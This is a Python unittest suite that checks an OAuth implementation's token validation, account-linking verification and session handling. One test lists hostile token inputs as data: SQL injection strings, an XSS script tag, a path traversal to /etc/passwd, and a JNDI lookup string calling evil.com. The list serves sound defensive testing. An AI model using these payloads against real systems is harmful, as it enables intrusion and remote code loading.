#!/usr/bin/env python3
"""
OAuth Security Tests

This test suite validates the security implementation of OAuth authentication including:
- Token validation security measures
- Account linking security controls
- Session management security features

Requirements: 3.1, 3.2, 3.3
"""

import unittest
import datetime
import hashlib
import hmac
import secrets
from unittest.mock import Mock, patch, MagicMock
from bson import ObjectId
import bcrypt
import requests

class TestOAuthTokenValidationSecurity(unittest.TestCase):
    """Test cases for OAuth token validation security"""
    
    def setUp(self):
        """Set up test fixtures"""
        # Import modules under test
        from utils.oauth_token_validator import OAuthTokenValidator
        from utils.oauth_token_security import TokenSecurityManager
        
        self.token_validator = OAuthTokenValidator()
        self.security_manager = TokenSecurityManager()
        
        # Test data
        self.valid_google_token = "valid_google_token_123"
        self.valid_github_token = "valid_github_token_456"
        self.invalid_token = "invalid_token_789"
        self.expired_token = "expired_token_abc"
    
    def test_token_validation_prevents_injection_attacks(self):
        """Test that token validation prevents injection attacks"""
        # Test SQL injection attempts
        malicious_tokens = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for malicious_token in malicious_tokens:
            with self.assertRaises(Exception):
                self.token_validator.validate_google_token(malicious_token)
            
            with self.assertRaises(Exception):
                self.token_validator.validate_github_token(malicious_token)
    
    def test_token_validation_enforces_https(self):
        """Test that token validation only uses HTTPS endpoints"""
        # Verify Google tokeninfo URL uses HTTPS
        self.assertTrue(self.token_validator.google_tokeninfo_url.startswith('https://'))
        
        # Verify GitHub API URL uses HTTPS
        self.assertTrue(self.token_validator.github_api_url.startswith('https://'))
    
    def test_token_validation_timeout_protection(self):
        """Test that token validation has timeout protection"""
        with patch('requests.get') as mock_get:
            # Simulate timeout
            mock_get.side_effect = requests.exceptions.Timeout("Request timed out")
            
            from utils.oauth_errors import OAuthException, OAuthErrorType
            
            with self.assertRaises(OAuthException) as context:
                self.token_validator.validate_google_token(self.valid_google_token)
            
            self.assertEqual(context.exception.error_type, OAuthErrorType.TIMEOUT)
    
    def test_token_validation_rate_limit_handling(self):
        """Test proper handling of rate limits from providers"""
        with patch('requests.get') as mock_get:
            # Simulate rate limit response
            mock_response = Mock()
            mock_response.status_code = 429
            mock_response.json.return_value = {"error": "rate_limit_exceeded"}
            mock_get.return_value = mock_response
            
            from utils.oauth_errors import OAuthException
            
            with self.assertRaises(OAuthException):
                self.token_validator.validate_google_token(self.valid_google_token)
    
    def test_token_validation_prevents_replay_attacks(self):
        """Test that token validation includes replay attack protection"""
        # Mock successful validation
        with patch('requests.get') as mock_get:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {
                'sub': 'user123',
                'email': 'test@example.com',
                'exp': str(int((datetime.datetime.utcnow() + datetime.timedelta(hours=1)).timestamp()))
            }
            mock_get.return_value = mock_response
            
            # First validation should succeed
            result1 = self.token_validator.validate_google_token(self.valid_google_token)
            self.assertTrue(result1['valid'])
            
            # Verify that validation includes timestamp checks
            self.assertIn('validated_at', result1)
            self.assertIsInstance(result1['validated_at'], datetime.datetime)
    
    def test_token_hashing_security(self):
        """Test secure token hashing implementation"""
        token = "sensitive_oauth_token"
        provider = "google"
        
        # Test token hashing
        hash1 = self.security_manager.hash_token(token, provider)
        hash2 = self.security_manager.hash_token(token, provider)
        
        # Same token should produce same hash
        self.assertEqual(hash1, hash2)
        
        # Hash should be different from original token
        self.assertNotEqual(hash1, token)
        
        # Hash should be hexadecimal
        self.assertTrue(all(c in '0123456789abcdef' for c in hash1))
        
        # Hash should be consistent length (SHA256 = 64 chars)
        self.assertEqual(len(hash1), 64)
    
    def test_token_hash_verification_security(self):
        """Test secure token hash verification"""
        token = "test_token_123"
        provider = "github"
        
        # Create hash
        token_hash = self.security_manager.hash_token(token, provider)
        
        # Verify correct token
        self.assertTrue(self.security_manager.verify_token_hash(token, token_hash, provider))
        
        # Verify incorrect token fails
        self.assertFalse(self.security_manager.verify_token_hash("wrong_token", token_hash, provider))
        
        # Verify timing attack protection (uses hmac.compare_digest)
        with patch('hmac.compare_digest') as mock_compare:
            mock_compare.return_value = True
            self.security_manager.verify_token_hash(token, token_hash, provider)
            mock_compare.assert_called_once()
    
    def test_token_encryption_security(self):
        """Test secure token encryption and decryption"""
        sensitive_token = "very_sensitive_oauth_token"
        
        # Encrypt token
        encrypted = self.security_manager.encrypt_token(sensitive_token)
        
        # Encrypted should be different from original
        self.assertNotEqual(encrypted, sensitive_token)
        
        # Decrypt token
        decrypted = self.security_manager.decrypt_token(encrypted)
        
        # Decrypted should match original
        self.assertEqual(decrypted, sensitive_token)
        
        # Test with invalid encrypted data
        with self.assertRaises(Exception):
            self.security_manager.decrypt_token("invalid_encrypted_data")

class TestOAuthAccountLinkingSecurityMeasures(unittest.TestCase):
    """Test cases for OAuth account linking security measures"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.mock_db = Mock()
        
        # Import the module under test
        from utils.oauth_account_linking import AccountLinkingSecurityManager
        self.linking_manager = AccountLinkingSecurityManager(self.mock_db)
        
        # Test data
        self.user_id = ObjectId()
        self.user_email = "test@example.com"
        self.provider = "google"
        self.oauth_data = {
            'id': 'google_user_123',
            'email': self.user_email,
            'name': 'Test User'
        }
    
    def test_email_verification_required_for_linking(self):
        """Test that email verification is required for account linking"""
        # Mock user lookup
        test_user = {
            '_id': self.user_id,
            'email_hash': 'test_hash',
            'password': bcrypt.hashpw('password'.encode(), bcrypt.gensalt()).decode()
        }
        self.mock_db.users.find_one.return_value = test_user
        
        with patch.object(self.linking_manager, '_verify_provider_identity') as mock_verify:
            mock_verify.return_value = {'verified': True, 'provider_email': self.user_email}
            
            with patch.object(self.linking_manager, '_determine_verification_requirements') as mock_requirements:
                mock_requirements.return_value = {
                    'email_verification_required': True,
                    'password_verification_required': True,
                    'steps': ['email_verification', 'password_verification']
                }
                
                with patch.object(self.linking_manager, '_create_linking_session'):
                    with patch.object(self.linking_manager, '_log_linking_activity'):
                        result = self.linking_manager.initiate_account_linking(
                            user_id=self.user_id,
                            provider=self.provider,
                            oauth_data=self.oauth_data
                        )
                        
                        # Verify email verification is required
                        self.assertTrue(result['verification_requirements']['email_verification_required'])
    
    def test_password_verification_required_for_existing_accounts(self):
        """Test that password verification is required for existing accounts"""
        # Mock user with password
        test_user = {
            '_id': self.user_id,
            'email_hash': 'test_hash',
            'password': bcrypt.hashpw('password'.encode(), bcrypt.gensalt()).decode()
        }
        
        requirements = self.linking_manager._determine_verification_requirements(
            user=test_user,
            provider=self.provider,
            oauth_data=self.oauth_data
        )
        
        # Password verification should be required
        self.assertTrue(requirements['password_verification_required'])
        
        # Check that password verification step exists in the steps list
        password_step_found = any(
            step.get('step') == 'password_verification' 
            for step in requirements['steps']
        )
        self.assertTrue(password_step_found)
    
    def test_provider_identity_verification_prevents_spoofing(self):
        """Test that provider identity verification prevents spoofing"""
        with patch('db.hash_email') as mock_hash:
            # Test with matching email
            mock_hash.return_value = 'correct_email_hash'
            
            # Mock no existing OAuth links
            self.mock_db.users.find_one.return_value = None
            
            result = self.linking_manager._verify_provider_identity(
                provider=self.provider,
                oauth_data=self.oauth_data,
                user_email_hash='correct_email_hash'
            )
            self.assertTrue(result['verified'])
            
            # Test with mismatched email (spoofing attempt)
            mock_hash.return_value = 'different_email_hash'
            
            result = self.linking_manager._verify_provider_identity(
                provider=self.provider,
                oauth_data=self.oauth_data,
                user_email_hash='correct_email_hash'
            )
            self.assertFalse(result['verified'])
            self.assertEqual(result['details']['reason'], 'email_mismatch')
    
    def test_verification_code_security(self):
        """Test security of email verification codes"""
        # Generate multiple codes
        codes = [self.linking_manager._generate_verification_code() for _ in range(100)]
        
        # All codes should be 6 digits
        for code in codes:
            self.assertEqual(len(code), 6)
            self.assertTrue(code.isdigit())
        
        # Codes should be unique (high probability)
        unique_codes = set(codes)
        self.assertGreater(len(unique_codes), 90)  # At least 90% unique
    
    def test_verification_attempt_limits(self):
        """Test that verification attempts are limited"""
        linking_session_id = str(ObjectId())
        
        # Mock session with max attempts
        mock_session = {
            '_id': ObjectId(linking_session_id),
            'user_id': self.user_id,
            'provider': self.provider,
            'email_verification_code': '123456',
            'email_verification_expires_at': datetime.datetime.utcnow() + datetime.timedelta(minutes=5),
            'email_verification_attempts': 5  # Max attempts reached
        }
        
        with patch.object(self.linking_manager, '_get_linking_session') as mock_get:
            mock_get.return_value = mock_session
            
            from utils.oauth_errors import OAuthException, OAuthErrorType
            
            with self.assertRaises(OAuthException) as context:
                self.linking_manager.verify_email_for_linking(
                    linking_session_id=linking_session_id,
                    verification_code='123456'
                )
            
            self.assertEqual(context.exception.error_type, OAuthErrorType.LINKING_ERROR)
    
    def test_verification_code_expiration(self):
        """Test that verification codes expire properly"""
        linking_session_id = str(ObjectId())
        
        # Mock session with expired code
        mock_session = {
            '_id': ObjectId(linking_session_id),
            'user_id': self.user_id,
            'provider': self.provider,
            'email_verification_code': '123456',
            'email_verification_expires_at': datetime.datetime.utcnow() - datetime.timedelta(minutes=1),
            'email_verification_attempts': 0
        }
        
        with patch.object(self.linking_manager, '_get_linking_session') as mock_get:
            mock_get.return_value = mock_session
            
            from utils.oauth_errors import OAuthException, OAuthErrorType
            
            with self.assertRaises(OAuthException) as context:
                self.linking_manager.verify_email_for_linking(
                    linking_session_id=linking_session_id,
                    verification_code='123456'
                )
            
            self.assertEqual(context.exception.error_type, OAuthErrorType.LINKING_ERROR)
            self.assertIn('expired', str(context.exception))

class TestOAuthSessionManagementSecurity(unittest.TestCase):
    """Test cases for OAuth session management security"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.mock_db = Mock()
        
        # Import modules under test
        from utils.oauth_session_manager import OAuthSessionManager
        from utils.oauth_token_security import TokenSecurityManager
        
        self.session_manager = OAuthSessionManager(self.mock_db)
        self.security_manager = TokenSecurityManager()
        
        # Test data
        self.user_id = ObjectId()
        self.provider = "google"
        self.provider_user_id = "google_user_123"
        self.access_token = "access_token_123"
        self.refresh_token = "refresh_token_456"
    
    def test_session_creation_security(self):
        """Test secure session creation"""
        # Mock database operations
        self.mock_db.oauth_sessions.insert_one.return_value = Mock(inserted_id=ObjectId())
        self.mock_db.oauth_sessions.find_one.return_value = {
            '_id': ObjectId(),
            'user_id': self.user_id,
            'provider': self.provider
        }
        self.mock_db.oauth_sessions.count_documents.return_value = 0
        
        # Create session
        session = self.session_manager.create_session(
            user_id=self.user_id,
            provider=self.provider,
            provider_user_id=self.provider_user_id,
            access_token=self.access_token,
            refresh_token=self.refresh_token,
            client_info={'ip': '192.168.1.1', 'user_agent': 'TestAgent'}
        )
        
        # Verify session was created
        self.mock_db.oauth_sessions.insert_one.assert_called_once()
        
        # Verify token was hashed (not stored in plain text)
        call_args = self.mock_db.oauth_sessions.insert_one.call_args[0][0]
        self.assertIn('access_token_hash', call_args)
        self.assertNotEqual(call_args['access_token_hash'], self.access_token)
    
    def test_session_expiration_security(self):
        """Test that sessions expire properly"""
        session_id = ObjectId()
        
        # Mock expired session
        expired_session = {
            '_id': session_id,
            'user_id': self.user_id,
            'provider': self.provider,
            'expires_at': datetime.datetime.utcnow() - datetime.timedelta(hours=1),
            'is_active': True
        }
        
        self.mock_db.oauth_sessions.find_one.return_value = expired_session
        
        # Try to get expired session
        result = self.session_manager.get_session(self.user_id, self.provider)
        
        # Should return None for expired session
        self.assertIsNone(result)
        
        # Verify session was marked as expired
        self.mock_db.oauth_sessions.update_one.assert_called()
    
    def test_session_limit_enforcement(self):
        """Test that session limits are enforced"""
        # Mock max sessions reached
        self.mock_db.oauth_sessions.count_documents.return_value = 10  # Max limit
        
        # Mock oldest session
        oldest_session = {
            '_id': ObjectId(),
            'user_id': self.user_id,
            'provider': self.provider,
            'created_at': datetime.datetime.utcnow() - datetime.timedelta(days=1)
        }
        self.mock_db.oauth_sessions.find_one.return_value = oldest_session
        
        # Mock session creation
        self.mock_db.oauth_sessions.insert_one.return_value = Mock(inserted_id=ObjectId())
        
        # Create new session (should trigger limit enforcement)
        with patch.object(self.session_manager, 'revoke_session') as mock_revoke:
            self.session_manager.create_session(
                user_id=self.user_id,
                provider=self.provider,
                provider_user_id=self.provider_user_id,
                access_token=self.access_token
            )
            
            # Verify oldest session was revoked
            mock_revoke.assert_called_once_with(oldest_session['_id'], 'session_limit_exceeded')
    
    def test_session_revocation_security(self):
        """Test secure session revocation"""
        session_id = ObjectId()
        
        # Mock session
        test_session = {
            '_id': session_id,
            'user_id': self.user_id,
            'provider': self.provider,
            'is_active': True
        }
        
        self.mock_db.oauth_sessions.find_one.return_value = test_session
        self.mock_db.oauth_sessions.update_one.return_value = Mock(modified_count=1)
        
        # Revoke session
        result = self.session_manager.revoke_session(session_id, 'user_logout')
        
        # Verify revocation
        self.assertTrue(result)
        
        # Verify session was marked as inactive
        update_call = self.mock_db.oauth_sessions.update_one.call_args
        update_doc = update_call[0][1]['$set']
        self.assertFalse(update_doc['is_active'])
        self.assertIn('revoked_at', update_doc)
        self.assertEqual(update_doc['revocation_reason'], 'user_logout')
    
    def test_session_cleanup_security(self):
        """Test secure cleanup of expired sessions"""
        # Mock expired sessions
        expired_sessions = [
            {
                '_id': ObjectId(),
                'user_id': self.user_id,
                'provider': 'google',
                'expires_at': datetime.datetime.utcnow() - datetime.timedelta(hours=1)
            },
            {
                '_id': ObjectId(),
                'user_id': self.user_id,
                'provider': 'github',
                'expires_at': datetime.datetime.utcnow() - datetime.timedelta(hours=2)
            }
        ]
        
        self.mock_db.oauth_sessions.find.return_value = expired_sessions
        self.mock_db.oauth_sessions.update_many.return_value = Mock(modified_count=2)
        
        # Run cleanup
        cleaned_count = self.session_manager.cleanup_expired_sessions()
        
        # Verify cleanup
        self.assertEqual(cleaned_count, 2)
        
        # Verify sessions were marked as expired
        self.mock_db.oauth_sessions.update_many.assert_called()
    
    def test_token_refresh_security(self):
        """Test secure token refresh process"""
        session_id = ObjectId()
        new_access_token = "new_access_token_789"
        new_refresh_token = "new_refresh_token_012"
        
        # Mock existing session
        existing_session = {
            '_id': session_id,
            'user_id': self.user_id,
            'provider': self.provider,
            'expires_at': datetime.datetime.utcnow() + datetime.timedelta(minutes=30),
            'is_active': True,
            'scopes': ['email', 'profile']
        }
        
        self.mock_db.oauth_sessions.find_one.return_value = existing_session
        self.mock_db.oauth_sessions.update_one.return_value = Mock(modified_count=1)
        
        # Refresh session
        result = self.session_manager.refresh_session(
            session_id=session_id,
            new_access_token=new_access_token,
            new_refresh_token=new_refresh_token,
            expires_in=3600
        )
        
        # Verify refresh
        self.assertTrue(result)
        
        # Verify new tokens were hashed
        update_call = self.mock_db.oauth_sessions.update_one.call_args
        update_doc = update_call[0][1]['$set']
        self.assertIn('access_token_hash', update_doc)
        self.assertNotEqual(update_doc['access_token_hash'], new_access_token)
        self.assertIn('refreshed_at', update_doc)
    
    def test_audit_logging_security(self):
        """Test that security events are properly logged"""
        from utils.oauth_session_manager import OAuthAuditLogger
        
        audit_logger = OAuthAuditLogger(self.mock_db)
        
        # Log security event
        audit_logger.log_oauth_event(
            user_id=self.user_id,
            action='suspicious_login_attempt',
            provider=self.provider,
            details={'reason': 'multiple_failed_attempts'},
            ip_address='192.168.1.100',
            user_agent='SuspiciousAgent'
        )
        
        # Verify audit log entry was created
        self.mock_db.oauth_audit_log.insert_one.assert_called_once()
        
        # Verify audit entry contains security information
        audit_entry = self.mock_db.oauth_audit_log.insert_one.call_args[0][0]
        self.assertEqual(audit_entry['user_id'], self.user_id)
        self.assertEqual(audit_entry['action'], 'suspicious_login_attempt')
        self.assertIn('timestamp', audit_entry)
        self.assertIn('client_info', audit_entry)

def run_oauth_security_tests():
    """Run all OAuth security tests"""
    print("🔒 Running OAuth Security Tests")
    print("=" * 50)
    
    # Create test suite
    test_classes = [
        TestOAuthTokenValidationSecurity,
        TestOAuthAccountLinkingSecurityMeasures,
        TestOAuthSessionManagementSecurity
    ]
    
    suite = unittest.TestSuite()
    for test_class in test_classes:
        tests = unittest.TestLoader().loadTestsFromTestCase(test_class)
        suite.addTests(tests)
    
    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    # Print summary
    print("\n" + "=" * 50)
    if result.wasSuccessful():
        print("✅ All OAuth security tests passed!")
        print(f"📊 Ran {result.testsRun} security tests successfully")
        return True
    else:
        print(f"❌ {len(result.failures)} test(s) failed, {len(result.errors)} error(s)")
        
        if result.failures:
            print("\n🔍 Failures:")
            for test, traceback in result.failures:
                print(f"  - {test}: {traceback}")
        
        if result.errors:
            print("\n🔍 Errors:")
            for test, traceback in result.errors:
                print(f"  - {test}: {traceback}")
        
        return False

if __name__ == "__main__":
    success = run_oauth_security_tests()
    exit(0 if success else 1)